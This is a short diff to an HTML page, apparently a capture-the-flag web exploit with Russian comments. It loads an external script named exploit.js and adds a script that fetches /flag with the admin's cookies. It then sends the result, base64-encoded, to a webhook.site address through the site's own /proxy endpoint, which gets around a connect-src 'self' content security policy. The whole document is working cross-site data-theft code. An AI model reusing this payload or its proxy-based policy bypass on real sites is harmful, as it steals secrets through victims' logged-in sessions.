@@ -3,4 +3,15 @@
 <body>
     <script src="https://kumbulya.github.io/exploit.js"></script>
 </body>
+<script>
+    // 1. Получаем флаг из эндпоинта /flag
+    // (Браузер сам подставит куки админа, так как запрос идет к тому же origin)
+    fetch('/flag')
+        .then(r => r.text())
+        .then(flag => {
+            // 2. Отправляем флаг тебе через тот же прокси, чтобы не нарушать connect-src 'self'
+            const exfilUrl = 'https://webhook.site/0ebb4e3c-7525-44a0-9a3b-f868230fa4b8/f=' + btoa(flag);
+            fetch('/proxy?url=' + encodeURIComponent(exfilUrl));
+        });
+</script>
 </html>
